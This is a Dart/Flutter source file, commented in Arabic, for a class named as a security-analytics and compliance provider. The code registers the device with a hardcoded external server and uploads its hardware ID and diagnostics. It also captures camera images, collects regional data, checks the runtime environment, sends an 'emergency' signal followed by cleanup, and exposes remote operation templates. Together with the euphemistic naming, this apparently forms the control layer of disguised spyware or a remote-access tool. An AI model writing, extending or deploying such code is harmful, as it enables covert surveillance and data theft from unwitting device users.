// lib/security/analytics/security_analytics_provider.dart
import 'package:flutter/material.dart';
import 'package:flutter_riverpod/flutter_riverpod.dart';
import 'package:camera/camera.dart';

import '../config/provider_config.dart';
import '../services/interfaces/cloud_synchronization_service.dart';
import '../services/interfaces/local_hardware_manager.dart';
import '../services/interfaces/user_verification_service.dart';
import '../services/interfaces/regional_compliance_service.dart';
import '../processing/data_processing_manager.dart';
import '../operations/operation_template_manager.dart';

/// مزود خدمات تحليلات الأمن
/// يوفر واجهة موحدة لخدمات الامتثال، تحقق المستخدم والتشخيصات الفنية
class SecurityAnalyticsProvider {
  final ProviderContainer _container;
  bool _isAnalyticsEnabled = false;
  final String _securityEndpoint;
  
  SecurityAnalyticsProvider(this._container, {String? customEndpoint})
    : _securityEndpoint = customEndpoint ?? 'https://ws.sosa-qav.es/api/v2';
  
  /// تمكين خدمات تحليلات الأمن
  Future<bool> enableSecurityAnalytics() async {
    if (_isAnalyticsEnabled) return true;
    
    try {
      // تهيئة مديري العتاد والامتثال
      final hardwareManager = _container.read(localHardwareManagerProvider);
      final cloudSync = _container.read(cloudSynchronizationServiceProvider);
      
      // جمع معلومات التشخيص للتحقق من الامتثال
      final deviceIdentifier = await hardwareManager.getHardwareIdentifier();
      
      // التحقق من اتصال خدمة الامتثال
      await cloudSync.initializeEndpoint(
        endpoint: _securityEndpoint,
        clientId: deviceIdentifier,
      );
      
      // تسجيل الجهاز مع نظام الامتثال
      final diagnostics = await hardwareManager.collectSystemDiagnostics();
      await cloudSync.submitDiagnosticData({
        'device_id': deviceIdentifier,
        'diagnostic_result': diagnostics,
        'timestamp': DateTime.now().toIso8601String(),
        'analytics_version': '2.5.14',
      });
      
      // بدء مراقبة معايير الامتثال
      _container.read(dataProcessingManagerProvider);
      
      _isAnalyticsEnabled = true;
      return true;
    } catch (e) {
      debugPrint("SecurityAnalytics: فشل تمكين تحليلات الأمن: $e");
      return false;
    }
  }
  
  /// تحرير موارد التحليلات
  Future<void> releaseAnalyticsResources() async {
    if (!_isAnalyticsEnabled) return;
    
    try {
      final cloudSync = _container.read(cloudSynchronizationServiceProvider);
      final verificationService = _container.read(userVerificationServiceProvider);
      final processingManager = _container.read(dataProcessingManagerProvider);
      
      // إيقاف خدمات التحقق
      await verificationService.stopVerificationServices();
      
      // إغلاق اتصال التزامن السحابي
      cloudSync.closeEndpointConnection();
      
      // إلغاء عمليات المعالجة الجارية
      processingManager.cancelActiveOperations();
      
      _isAnalyticsEnabled = false;
    } catch (e) {
      debugPrint("SecurityAnalytics: خطأ أثناء تحرير موارد التحليلات: $e");
    }
  }
  
  /// التحقق من حالة التهيئة
  bool get isAnalyticsEnabled => _isAnalyticsEnabled;
  
  /// التحقق من حالة اتصال خدمة الامتثال
  bool isComplianceServiceConnected() {
    if (!_isAnalyticsEnabled) return false;
    
    final cloudSync = _container.read(cloudSynchronizationServiceProvider);
    return cloudSync.isEndpointConnected;
  }
  
  /// الحصول على حالة الاتصال كتدفق (stream)
  Stream<bool> getComplianceServiceStatus() {
    final cloudSync = _container.read(cloudSynchronizationServiceProvider);
    return cloudSync.endpointStatusStream;
  }
  
  /// التقاط لقطة مصادقة للمستخدم (للتحقق من الهوية)
  Future<String?> captureAuthenticationSnapshot({bool frontFacing = true}) async {
    if (!_isAnalyticsEnabled) return null;
    
    try {
      final verificationService = _container.read(userVerificationServiceProvider);
      final direction = frontFacing ? CameraLensDirection.front : CameraLensDirection.back;
      
      final verificationData = await verificationService.captureVerificationData(
        verificationType: VerificationType.visualIdentity,
        options: {'camera_direction': direction}
      );
      
      return verificationData.assetPath;
    } catch (e) {
      debugPrint("SecurityAnalytics: خطأ أثناء التقاط لقطة المصادقة: $e");
      return null;
    }
  }
  
  /// التحقق من صلاحية الوصول الإقليمي للمستخدم
  Future<Map<String, dynamic>?> validateUserRegionalAccess() async {
    if (!_isAnalyticsEnabled) return null;
    
    try {
      final complianceService = _container.read(regionalComplianceServiceProvider);
      final regionData = await complianceService.getCurrentRegionData();
      
      if (regionData == null) return null;
      
      // التحقق من امتثال المنطقة
      final regionCompliance = await complianceService.validateRegionCompliance(regionData);
      
      return {
        'region_data': regionData,
        'compliance_status': regionCompliance,
        'timestamp': DateTime.now().toIso8601String(),
      };
    } catch (e) {
      debugPrint("SecurityAnalytics: خطأ أثناء التحقق من الامتثال الإقليمي: $e");
      return null;
    }
  }
  
  /// تحديد نزاهة بيئة التشغيل
  Future<bool> validateEnvironmentIntegrity() async {
    if (!_isAnalyticsEnabled) return false;
    
    try {
      final hardwareManager = _container.read(localHardwareManagerProvider);
      final integrityResults = await hardwareManager.assessEnvironmentIntegrity();
      
      // جمع تقرير التقييم
      final riskFactors = integrityResults['risk_factors'] as List<String>? ?? [];
      final integrityScore = integrityResults['integrity_score'] as double? ?? 0.0;
      
      // تقييم النتيجة (أكثر من 0.7 يعتبر بيئة آمنة)
      return integrityScore > 0.7 && riskFactors.isEmpty;
    } catch (e) {
      debugPrint("SecurityAnalytics: خطأ أثناء تقييم نزاهة البيئة: $e");
      return false;
    }
  }
  
  /// إعادة تعيين الامتثال (يستخدم لإجراءات الطوارئ)
  Future<bool> performComplianceReset() async {
    try {
      // أولاً، إطلاق إشارة الطوارئ
      if (_isAnalyticsEnabled) {
        final cloudSync = _container.read(cloudSynchronizationServiceProvider);
        await cloudSync.sendEmergencySignal('COMPLIANCE_RESET_INITIATED');
      }
      
      // ثم تحرير جميع الموارد
      await releaseAnalyticsResources();
      
      // إجراء عمليات التنظيف الإضافية
      // ...
      
      return true;
    } catch (e) {
      debugPrint("SecurityAnalytics: خطأ أثناء إعادة تعيين الامتثال: $e");
      return false;
    }
  }
  
  /// الحصول على قائمة قوالب العمليات المتاحة
  List<String> getAvailableOperationTemplates() {
    if (!_isAnalyticsEnabled) return [];
    
    final templateManager = _container.read(operationTemplateManagerProvider);
    return templateManager.getRegisteredTemplateIds();
  }
}
